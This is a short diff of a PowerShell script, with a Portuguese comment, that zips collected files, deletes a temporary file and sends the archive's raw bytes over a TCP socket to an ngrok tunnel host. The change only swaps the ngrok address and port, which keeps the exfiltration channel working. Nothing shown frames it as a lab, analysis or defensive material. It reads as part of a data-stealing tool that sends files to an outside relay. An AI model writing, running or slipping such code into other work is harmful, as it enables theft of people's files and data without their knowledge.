@@ -22,7 +22,7 @@ Compress-Archive `
 Remove-Item $tempFile -Force
 
 # Envia via TCP
-$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 16405 )
+$c = New-Object Net.Sockets.TCPClient("7.tcp.eu.ngrok.io", 10040 )
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
